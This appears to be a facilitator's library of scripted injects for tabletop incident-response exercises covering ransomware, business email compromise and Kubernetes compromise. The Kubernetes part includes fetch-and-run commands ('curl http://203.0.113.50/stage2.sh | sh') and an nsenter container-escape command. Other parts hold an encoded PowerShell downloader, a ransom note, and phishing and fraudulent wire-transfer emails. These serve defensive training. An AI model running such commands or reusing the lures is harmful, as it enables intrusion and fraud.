# Atomics Library for Tabletop Exercise Runners

**Executable inject sequences for realistic scenario delivery**

---

## What Are Atomics?

**Atomics** are discrete, executable actions that exercise runners perform to simulate realistic incident progression. Each atomic includes:
- **Timing**: When to execute (T+Xmin from scenario start)
- **Action**: Specific task to perform (display alert, send email, update dashboard)
- **Expected Response**: What participants should do
- **Fallback**: What to do if participants don't respond as expected

Think of atomics as a script for the runner to execute the scenario faithfully.

---

## Atomic Naming Convention

```
[CATEGORY]-[TYPE]-[SEQUENCE]

Examples:
- PHISH-001: First phishing email inject
- EDR-ALERT-001: First EDR alert
- EXEC-EMAIL-001: First executive email
- BACKUP-FAIL-001: Backup system failure
```

---

## Complete Atomic Sets by Scenario

### Scenario 1: Ransomware Attack

#### Pre-Exercise Setup (T-60min)
```bash
# Atomic ID: SETUP-RANSOMWARE-001
# Description: Prepare test environment

ACTIONS:
1. Create isolated test VM: VICTIM-WORKSTATION-01
   - OS: Windows 10/11
   - User account: testuser / TestPass123!
   - Install monitoring agent (simulate EDR)

2. Deploy test file share: \\fileserver\testshare
   - Create 50-100 test files (documents, spreadsheets)
   - Map share to VICTIM-WORKSTATION-01

3. Configure email server for phishing simulation
   - Sender: external-sender@suspicious-domain.tk
   - Test delivery to participant inbox

4. Prepare EDR console access
   - Runner has admin access to EDR dashboard
   - Can generate test alerts on demand

5. Stage materials in runner directory:
   - /exercises/ransomware-2024/ransom-note.txt
   - /exercises/ransomware-2024/c2-server-logs.txt
   - /exercises/ransomware-2024/encrypted-file-list.csv

VERIFICATION:
- [ ] Test VM is online and accessible
- [ ] File share is mapped and contains test files
- [ ] Phishing email can be sent successfully
- [ ] EDR console shows test alerts
- [ ] All staged materials are accessible
```

#### Atomic Sequence

```markdown
## T+0 (Initial Compromise)
**Atomic ID**: PHISH-001
**Category**: Initial Access
**Action**: Send phishing email to participant John Doe

**Email Details**:
From: billing@micr0s0ft-updates.tk
To: jdoe@company.com
Subject: "Urgent: Microsoft 365 License Expiration"
Body:
"Your Microsoft 365 license will expire in 24 hours. Click here to renew: [malicious-link]"
Attachment: Invoice_Feb2024.pdf (actually .pdf.exe if opened)

**Delivery Method**:
- Use test email server to deliver to participant's inbox
- If in-person exercise, hand participant a printed "email screenshot"

**Expected Response**:
Participant reports email to security team within 15 minutes

**If No Response**:
Proceed to T+15 inject. During debrief, discuss why suspicious email wasn't reported.

**Facilitator Note**:
"This email was reported to your security team. What's your first step to investigate?"

---

## T+15 (EDR Alert - Suspicious Process)
**Atomic ID**: EDR-ALERT-001
**Category**: Detection
**Action**: Display EDR alert on SOC dashboard

**Alert Details**:
- Timestamp: [Current time - 5 minutes]
- Host: VICTIM-WORKSTATION-01
- User: jdoe
- Process: powershell.exe -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVQB5ADAANwBDAE0AQgBDAC8AcwAzAFEAMABGAEIAUQBVAEYAQgBnAFkARwBCAG8AYQBHAGgAbwA...
- Severity: HIGH
- Rule: "Suspicious PowerShell Encoded Command"

**How to Display**:
- Update EDR console with alert
- OR: Show screenshot of alert to participants
- OR: Read alert details aloud

**Expected Response**:
SOC analyst triages alert, requests decoded command, escalates to IR team

**Conditional Response - If Asked About Decoded Command**:
"The decoded PowerShell downloads and executes a second-stage payload from 203.0.113.42/update.exe"

**Conditional Response - If Asked About 203.0.113.42**:
"WHOIS shows it's registered in [Eastern European country]. First seen: 3 days ago. No reputation data available."

**If No Response Within 10 Minutes**:
Facilitator prompts: "Your EDR has been generating high-severity alerts for the last 10 minutes. What's the SOC's response?"

---

## T+30 (File Encryption Begins)
**Atomic ID**: FILE-ENCRYPT-001
**Category**: Impact
**Action**: Simulate file encryption activity

**Method 1 - EDR Console Update**:
Display multiple rapid-fire alerts:
- "Mass file modification detected on \\fileserver\shares"
- "Suspicious .encrypted file extensions observed"
- "High disk write activity on FILESERVER-01"

**Method 2 - User Complaint**:
Simulate phone call/Slack message from user:
"I can't open any of my files. They all have .locked extensions now. What's going on?"

**Method 3 - File Share Screenshot**:
Show screenshot of file share with visible .encrypted files:
- Budget_2024.xlsx.encrypted
- Contracts_Q1.docx.encrypted
- Customer_Database.mdb.encrypted

**Expected Response**:
IR team recognizes ransomware, initiates containment procedures (network isolation, host shutdown)

**Conditional Response - If Asked "How Many Files"**:
"Approximately 15,000 files across 3 file shares have been encrypted so far. The encryption is spreading to additional shares."

**Conditional Response - If Asked "Can We Restore from Backup"**:
Hold response until T+45 (backup failure inject)

---

## T+45 (Backup System Failure)
**Atomic ID**: BACKUP-FAIL-001
**Category**: Impact Escalation
**Action**: Update backup system dashboard

**Dashboard Changes**:
- Replication Status: ✗ FAILED
- Last Successful Backup: 7 days ago
- Error Message: "Cannot connect to backup-server-02.internal - Connection refused"
- Affected Systems: All file servers

**Additional Detail - If IT Investigates Backup Server**:
"Backup server logs show encrypted files: veeam_backup.vbk.encrypted"
"It appears the ransomware spread to the backup server through mapped network shares."

**Expected Response**:
IT team reports backup failure to IR team, escalates severity, explores alternate recovery options

**Conditional Response - If Asked "Do We Have Offline Backups"**:
Choose based on organization's actual posture:
- Option A (No Offline): "No offline or immutable backups exist."
- Option B (Yes Offline): "Offline backups exist but are 14 days old. Restoring would lose 2 weeks of data."

---

## T+60 (Ransom Note Delivery)
**Atomic ID**: RANSOM-NOTE-001
**Category**: Impact
**Action**: Deliver ransom note to participants

**Method 1 - File Share**:
Create visible file: !!!README_IMPORTANT!!!.txt on encrypted file share

**Method 2 - Desktop Background**:
Simulate desktop wallpaper change showing ransom note (show screenshot)

**Method 3 - Email**:
Send email to IT helpdesk from attacker:
Subject: "Your files have been encrypted"

**Ransom Note Content**:
```
╔═══════════════════════════════════════╗
║   YOUR FILES HAVE BEEN ENCRYPTED      ║
╚═══════════════════════════════════════╝

All your files have been encrypted with military-grade encryption.

Do NOT attempt to decrypt files yourself - you will lose them permanently.
Do NOT contact law enforcement - we are monitoring your network.
Do NOT restart encrypted systems - you will destroy recovery keys.

WHAT HAPPENED:
Your network security is weak. We encrypted 50,000+ files across your file servers and backups.

WHAT DO YOU NEED TO DO:
Pay 50 BTC ($1,850,000 USD at current rates) to the following Bitcoin address:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

HOW TO PAY:
1. Download TOR Browser
2. Visit: http://[onion-address].onion
3. Enter your company ID: COMP-2024-00742
4. Follow payment instructions

TIME LIMIT:
You have 72 hours to pay. Price doubles every 24 hours after deadline.
After 7 days, decryption keys are permanently deleted.

WARNING:
If you contact FBI or law enforcement, we will publish your data:
- 500 GB of customer records
- Financial documents
- Executive emails and contracts

Contact: [email protected] (TOR mail only)
```

**Expected Response**:
IR team documents ransom note, discusses payment policy, contacts legal team, notifies executives

**Conditional Response - If Asked "Should We Pay"**:
Facilitator: "That's a critical business decision. What's your organization's policy on ransom payments? Who has authority to make that decision?"

---

## T+75 (Executive Pressure)
**Atomic ID**: EXEC-EMAIL-001
**Category**: Escalation
**Action**: Deliver email from CEO to CTO

**Email**:
From: CEO@company.com
To: CTO@company.com
Cc: CFO@company.com, General Counsel@company.com
Subject: RE: Network Outage - URGENT

"I'm hearing from multiple departments that critical systems are down. The sales team can't access customer records. Finance can't process payroll. This is costing us thousands per hour.

I need answers:
1. What happened?
2. How long until systems are restored?
3. Do we need to invoke our cyber insurance?
4. Should I be preparing a statement for customers?
5. Do we need to involve the board?

I'm available for a call immediately."

**Expected Response**:
CTO/CISO prepares executive brief, provides status update, estimates recovery timeline, discusses business impact

**Facilitator Note**:
If participants haven't briefed executives yet, this inject should create urgency around executive communication procedures.

---

## T+90 (Media Inquiry)
**Atomic ID**: MEDIA-INQUIRY-001
**Category**: External Communication
**Action**: Simulate journalist phone call

**Scenario**:
Runner role-plays journalist calling company main line:
"Hi, this is Sarah Chen from [Tech News Outlet]. We received a tip that your company was hit by a ransomware attack. Can you comment on:
- Is it true your systems are encrypted?
- How many customer records were affected?
- Have you paid the ransom?
- When will services be restored?"

**Expected Response**:
Receptionist/PR team follows media inquiry procedures, routes to appropriate spokesperson, no unauthorized statements

**Conditional Response - If No Media Policy Exists**:
"Employee at front desk provides unvetted comments to journalist. Article published within 30 minutes with inaccurate information."

**Facilitator Note**:
This inject tests external communication procedures and identifies who has authority to speak to media.

---

## T+120 (Scenario Conclusion)
**Atomic ID**: SCENARIO-END-001
**Action**: Wrap up scenario, transition to debrief

**Facilitator Script**:
"Let's pause the scenario here. At this point in a real incident, your team would continue containment, recovery, and communication efforts. Before we move to the debrief, let's summarize the current state:

Current Situation:
- 15,000+ files encrypted across 3 file servers
- Backups compromised
- Ransom demand: 50 BTC ($1.85M)
- 72-hour deadline before price doubles
- Executive team and media aware of incident
- Customer-facing services degraded

Decisions Made:
[Summarize key decisions participants made]

Outstanding Questions:
[Note any unresolved decision points]

We'll now transition to the hot wash where we'll discuss what went well, what could improve, and identify any gaps in your procedures."
```

---

### Scenario 2: Business Email Compromise (BEC)

#### Pre-Exercise Setup
```bash
# Atomic ID: SETUP-BEC-001

ACTIONS:
1. Prepare spoofed email account
   - Create: cfo@comp4ny.com (note the "4" instead of "a")
   - OR: Configure email server to allow spoofed From: header

2. Identify target for fraudulent wire transfer
   - Accounts Payable contact: ap@company.com
   - Finance Manager: fmanager@company.com

3. Stage fake invoice in runner directory
   - /exercises/bec-2024/fake-invoice-VendorAcme.pdf
   - Realistic vendor name, amount: $250,000

4. Prepare OAuth token theft evidence (if technical scenario)
   - /exercises/bec-2024/azure-ad-login-logs.csv
   - Shows suspicious login from foreign IP

VERIFICATION:
- [ ] Spoofed email can be sent successfully
- [ ] Fake invoice looks legitimate
- [ ] OAuth logs show realistic compromise indicators
```

#### Atomic Sequence

```markdown
## T+0 (Initial Spear Phishing)
**Atomic ID**: PHISH-BEC-001
**Action**: Send OAuth token theft email to CFO

**Email**:
From: microsoft-security@micr0s0ft-alerts.com
To: cfo@company.com
Subject: "Action Required: Suspicious Sign-In Attempt Blocked"
Body:
"We detected a suspicious sign-in attempt to your Microsoft 365 account from IP: 203.0.113.99 (Location: Beijing, China).

For your security, we have temporarily locked your account.

Click here to verify your identity and restore access: [malicious-OAuth-link]

If you did not attempt to sign in from this location, your password may be compromised."

**Expected Response**:
CFO clicks link (simulated), security team receives OAuth compromise indicator

**If No Response**:
Proceed to T+15 (assume compromise occurred)

---

## T+15 (OAuth Token Used - Login Alert)
**Atomic ID**: OAUTH-COMPROMISE-001
**Action**: Generate Azure AD/Entra ID suspicious login alert

**Alert Details**:
- User: cfo@company.com
- Time: [Current time - 10 minutes]
- IP Address: 203.0.113.99
- Location: Ashburn, VA, USA (actually VPN exit node)
- Risk Level: HIGH
- Reason: "Anomalous travel - User typically logs in from Seattle, WA. Login detected from Virginia 10 minutes after Seattle session."
- OAuth App: "Microsoft Office 365 Admin Portal" (legitimate-looking)

**Expected Response**:
Security team flags suspicious login, investigates OAuth consent, considers token revocation

**Conditional Response - If Asked About OAuth App Permissions**:
"The OAuth app has the following permissions: Mail.ReadWrite, Contacts.Read, Files.ReadWrite.All, User.Read"

---

## T+30 (Fraudulent Wire Transfer Email)
**Atomic ID**: BEC-WIRE-001
**Action**: Send spoofed email from "CFO" to Finance Manager

**Email**:
From: cfo@comp4ny.com (spoofed domain - note "4" instead of "a")
To: fmanager@company.com
Subject: "RE: Vendor Payment - Acme Corporation - URGENT"
Body:
"I'm in meetings all afternoon but need you to process this payment today. We have a critical vendor invoice from Acme Corporation that's past due and they're threatening to halt services.

Wire transfer details:
Amount: $250,000.00
Recipient: Acme Corporation LLC
Bank: First International Bank
Account: 9876543210
Routing: 021000021
Reference: Invoice #ACM-2024-0142

Please process this immediately and confirm once sent. I'll be in back-to-back meetings but you can text me at [phone] if there are any issues.

Thanks,
[CFO Name]
CFO, [Company Name]"

Attachment: Invoice_ACM-2024-0142.pdf (realistic fake invoice)

**Expected Response**:
Finance Manager follows verification procedures, attempts to contact CFO through out-of-band method (phone, Slack), flags suspicious request

**If Finance Manager Approves Without Verification**:
Runner: "Payment processing system shows wire transfer of $250,000 has been initiated. Estimated clearing time: 2-4 hours."

**If Finance Manager Verifies Out-of-Band**:
Runner (as CFO): "I didn't send that email. This is fraudulent. Stop the payment immediately."

---

## T+45 (Payment System Alert OR Fraud Discovery)
**Atomic ID**: WIRE-ALERT-001
**Action**: Payment system notification

**Scenario A - If Payment Was Initiated**:
Alert: "Wire transfer of $250,000 to First International Bank, Account 9876543210 has been initiated. Status: Pending approval by secondary signer."

**Expected Response**:
Secondary approval process catches fraud, wire is cancelled, incident escalated

**Scenario B - If Payment Was Blocked**:
"CFO" sends follow-up email:
"Why wasn't that payment processed? I explicitly said it was urgent. This vendor is critical to operations."

**Expected Response**:
Finance team stands firm on verification procedures, escalates to security team for investigation

---

## T+60 (Investigation Reveals OAuth Compromise)
**Atomic ID**: INVESTIGATE-OAUTH-001
**Action**: Provide investigation findings

**Security Team Discovers**:
- CFO's OAuth token was compromised via phishing link at T+0
- Attacker accessed CFO's emails and contacts list
- Attacker sent BEC email from external spoofed domain
- No internal email compromise (came from external server)

**Evidence Available**:
- Azure AD logs show OAuth consent grant from suspicious IP
- Email headers show "Received: from mail-server-external.tk"
- CFO's mailbox shows no "Sent Items" for fraudulent email

**Expected Response**:
Security team revokes OAuth token, resets CFO password, blocks spoofed domain, investigates extent of email access

---

## T+75 (Scenario Conclusion - Impact Assessment)
**Atomic ID**: BEC-IMPACT-001
**Action**: Wrap up scenario

**Facilitator Summary**:
"Let's conclude the scenario. Here's the final state:

Outcome:
- [If payment blocked]: $250,000 fraudulent wire transfer was blocked by verification procedures
- [If payment sent]: $250,000 wire transfer was sent to attacker-controlled account, currently working with bank to recover

Root Cause:
- CFO clicked OAuth phishing link, granting attacker access to email/contacts
- Attacker used information to craft convincing BEC email
- Spoofed domain closely resembled legitimate company domain

Remediation Actions Taken:
[Summarize participant actions]

We'll now discuss what worked, what could improve, and what procedures may need to be updated."
```

---

### Scenario 3: Kubernetes Cluster Compromise

#### Pre-Exercise Setup
```bash
# Atomic ID: SETUP-K8S-001

ACTIONS:
1. Prepare Kubernetes test cluster
   - Use kind/minikube for demo environment
   - OR: Use screenshot-based simulation

2. Stage malicious pod manifests
   - /exercises/k8s-2024/cryptominer-pod.yaml
   - /exercises/k8s-2024/privilege-escalation-pod.yaml

3. Prepare kubectl alert screenshots
   - Unauthorized pod creation
   - Container escape attempt
   - Resource exhaustion

4. Configure monitoring dashboards
   - CPU/Memory utilization graphs
   - Network traffic graphs
   - Pod creation timeline

VERIFICATION:
- [ ] Test cluster is accessible (if using real cluster)
- [ ] Alert screenshots are realistic
- [ ] Monitoring dashboards show baseline metrics
```

#### Atomic Sequence

```markdown
## T+0 (Exposed API Server Discovery)
**Atomic ID**: K8S-RECON-001
**Action**: Simulate external reconnaissance

**Security Team Alert**:
"Our threat intelligence feed shows our Kubernetes API server (k8s-api.company.com:6443) is being actively scanned by multiple IPs.

Scan activity:
- Source IPs: 45.33.32.156, 198.27.92.37, 104.131.72.89
- Target: k8s-api.company.com:6443
- Method: Certificate enumeration, version detection
- Tools detected: kubectl, Shodan, masscan"

**Expected Response**:
Security team verifies API server exposure, reviews RBAC policies, checks for vulnerable configurations

**Conditional Response - If Asked "Is API Server Public"**:
"Yes, the API server is publicly accessible. It's protected by certificate authentication, but older clusters may have RBAC misconfigurations."

---

## T+15 (Unauthorized Pod Creation)
**Atomic ID**: K8S-POD-CREATE-001
**Action**: Display kubectl alert for unauthorized pod

**Alert**:
Source: Kubernetes Audit Log
Severity: HIGH
Time: [Current time - 5 minutes]
Event: Pod Created
Namespace: kube-system
Pod Name: system-monitor-x7j2k
Image: alpine:latest
User: system:anonymous
Verb: CREATE

**Expected Response**:
K8s admin investigates pod, checks for unauthorized service account usage, reviews RBAC bindings

**Conditional Response - If Admin Describes Pod**:
```yaml
kubectl describe pod system-monitor-x7j2k -n kube-system

Name: system-monitor-x7j2k
Namespace: kube-system
Priority: 0
Node: worker-node-03
Image: alpine:latest
State: Running
Command: ["/bin/sh", "-c", "while true; do curl -fsSL http://203.0.113.50/stage2.sh | sh; sleep 3600; done"]
```

---

## T+30 (Container Escape Attempt)
**Atomic ID**: K8S-ESCAPE-001
**Action**: Falco alert for container escape

**Alert**:
Source: Falco Runtime Security
Severity: CRITICAL
Rule: "Launch Privileged Container"
Container: system-monitor-x7j2k
Command: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
Description: "Container attempting to break out to host namespace using nsenter"

**Expected Response**:
IR team recognizes container escape attempt, kills pod immediately, investigates host compromise, checks other pods for similar activity

---

## T+45 (Cryptominer Deployment)
**Atomic ID**: K8S-CRYPTOMINER-001
**Action**: Resource utilization spike

**Monitoring Alert**:
Dashboard shows:
- CPU utilization: 95% across all worker nodes (was 30%)
- New pods created: 47 pods named "nginx-cache-[random]"
- Outbound network traffic spike to pool.minexmr.com:443

**kubectl get pods --all-namespaces**:
```
NAMESPACE   NAME                  READY   STATUS    AGE
default     nginx-cache-7x9k2     1/1     Running   2m
default     nginx-cache-2j4m9     1/1     Running   2m
default     nginx-cache-9s8p1     1/1     Running   2m
[... 44 more similar pods ...]
```

**Expected Response**:
Team recognizes cryptomining operation, deletes malicious pods, blocks outbound connections to mining pools, investigates initial access vector

---

## T+60 (Persistence Discovered)
**Atomic ID**: K8S-PERSISTENCE-001
**Action**: Investigation reveals persistence mechanism

**Findings**:
```bash
kubectl get cronjobs --all-namespaces

NAMESPACE    NAME              SCHEDULE      ACTIVE
kube-system  system-cleanup    */5 * * * *   1

kubectl describe cronjob system-cleanup -n kube-system

Schedule: */5 * * * * (every 5 minutes)
Job Template:
  Image: alpine:latest
  Command: curl http://203.0.113.50/deploy.sh | sh
  # Re-deploys cryptominer pods if deleted
```

**Expected Response**:
Team deletes cronjob, implements pod security policies, reviews all service accounts and RBAC bindings

---

## T+75 (Scenario Conclusion)
**Atomic ID**: K8S-CONCLUSION-001
**Action**: Wrap up scenario

**Facilitator Summary**:
"Scenario complete. Summary:

Attack Chain:
1. Anonymous access to API server due to RBAC misconfiguration
2. Initial pod deployed in kube-system namespace
3. Container escape attempted using nsenter
4. Cryptominer daemonset deployed across cluster
5. CronJob created for persistence

Impact:
- 95% CPU utilization cluster-wide for 30+ minutes
- Estimated cloud cost: $500+ from resource overutilization
- Potential data access if container escape succeeded

Remediation:
[Summarize participant actions]

Let's discuss: What K8s security policies could have prevented this?"
```

---

## Atomic Response Templates

### For Conditional Questions

When participants ask questions not explicitly scripted, use these templates:

#### "Can you check [logs/system/tool]?"
```
TEMPLATE:
"You check [system] and find:
- [Finding 1 - confirms scenario progression]
- [Finding 2 - adds complexity]
- [Finding 3 - provides investigative lead]

What's your next step?"

EXAMPLE:
"You check firewall logs and find:
- 47 outbound connections to 203.0.113.42 over the past 2 hours
- Total data transferred: 2.3 GB
- Destination port: 8443 (HTTPS)
- First connection timestamp correlates with the initial EDR alert

What's your next step?"
```

#### "What's the impact if we [take action]?"
```
TEMPLATE:
"If you [action], the likely impact is:
- [Positive outcome]
- [Potential side effect]
- [Business consideration]

This is a decision point. What do you want to do?"

EXAMPLE:
"If you isolate the file server from the network:
- Ransomware spread will be contained to already-encrypted files
- Users will lose access to all file shares (500+ users affected)
- Business operations requiring file access will halt

This is a decision point. What do you want to do?"
```

#### "Do we have [tool/capability/process]?"
```
TEMPLATE:
"Let me check your organization's current capabilities:
[If they have it]: Yes, you have [tool/process]. [Describe current state]
[If they don't]: No, that capability isn't currently available. [Suggest alternative]

EXAMPLE (They Have It):
"Yes, you have EDR with network isolation capability. You can remotely isolate compromised hosts from your EDR console. Current licensed seat count: 500 endpoints."

EXAMPLE (They Don't):
"No, automated network isolation isn't currently available in your environment. To isolate a host, you would need to manually disable the switch port or have the user disconnect network cable. Estimated time: 15-30 minutes per host."
```

---

## Timing Adjustments

### If Scenario is Moving Too Fast
- Add 15-minute "investigation time" between injects
- Insert conditional injects based on participant questions
- Pause for deeper discussion on decision points

### If Scenario is Moving Too Slow
- Combine multiple injects (deliver 2 at once)
- Skip optional injects
- Fast-forward: "It's now 2 hours later, and..."

### If Participants Are Stuck
- Provide hint: "Have you considered checking [system/log]?"
- Introduce new inject that provides investigative lead
- Ask open-ended question: "What information would help you make this decision?"

---

## Runner Best Practices

### Before Exercise
1. Read all atomics 2-3 times until familiar
2. Test email delivery, alert display methods
3. Prepare all materials in easy-to-access locations
4. Set phone timer for inject intervals
5. Print physical copies of key injects as backup

### During Exercise
1. Follow timing strictly (±5 minutes acceptable)
2. Deliver injects as scripted unless facilitator signals otherwise
3. Note participant responses for AAR
4. If participants ask unexpected questions, consult "Response Templates" section
5. Maintain neutral tone - don't lead participants to answers

### After Exercise
1. Document which atomics were delivered
2. Note which atomics were skipped/modified and why
3. Capture participant questions that weren't scripted
4. Provide feedback to facilitator for future exercise improvements

---

## Atomic Testing Checklist

Before any tabletop exercise, test all technical atomics:

- [ ] Email delivery (phishing simulations)
- [ ] Alert display (EDR, SIEM dashboards)
- [ ] Dashboard updates (monitoring systems)
- [ ] File share access (if simulating ransomware)
- [ ] OAuth/SSO login simulation
- [ ] kubectl/cloud console access
- [ ] All staged materials are accessible
- [ ] Backup communication methods (phone, Slack) work
- [ ] Runner has all necessary credentials
- [ ] Timing device (phone timer, stopwatch) is ready

---

**End of Atomics Library**

For scenario-specific atomics, reference:
- SKILL.md: Scenario Types section
- SCENARIO-TEMPLATES.md: Pre-built scenarios with complete atomic sequences
